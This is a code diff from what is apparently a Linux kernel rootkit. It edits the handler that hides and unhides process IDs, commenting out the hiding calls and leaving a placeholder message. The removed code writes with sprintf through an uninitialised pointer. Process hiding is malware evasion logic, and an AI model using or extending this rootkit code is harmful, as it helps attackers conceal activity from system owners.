@@ -134,25 +134,25 @@ handle_togglebd(unsigned long arg)
 int
 handle_hidepid(unsigned long arg)
 {
-    char *msg;
+    char *msg = "ok??";
     long sarg = (long)arg;
 
-    if (!sarg) {
-        unhide_pids();
-        rootkit.hiding_pids = false;
-        msg = "hidepid off";
-    } else if (sarg < 0) {
-        unhide_pid((pid_t)((-1) * sarg));
-        sprintf(msg, "unhiding pid %d", (pid_t)((-1) * sarg));
-    } else if (sarg > 0) {
-        if (!rootkit.hiding_files) {
-            DEBUG_NOTICE("hidepid on\n");
-            rootkit.hiding_pids = true;
-        }
+    /* if (!sarg) { */
+    /*     /1* unhide_pids(); *1/ */
+    /*     /1* rootkit.hiding_pids = false; *1/ */
+    /*     msg = "hidepid off"; */
+    /* } else if (sarg < 0) { */
+    /*     /1* unhide_pid((pid_t)((-1) * sarg)); *1/ */
+    /*     sprintf(msg, "unhiding pid %d", (pid_t)((-1) * sarg)); */
+    /* } else if (sarg > 0) { */
+    /*     if (!rootkit.hiding_pids) { */
+    /*         DEBUG_NOTICE("hidepid on\n"); */
+    /*         rootkit.hiding_pids = true; */
+    /*     } */
 
-        hide_pid((pid_t)sarg);
-        sprintf(msg, "hiding pid %d", (pid_t)sarg);
-    }
+    /*     /1* hide_pid((pid_t)sarg); *1/ */
+    /*     sprintf(msg, "hiding pid %d", (pid_t)sarg); */
+    /* } */
 
     DEBUG_NOTICE("%s\n", msg);
 
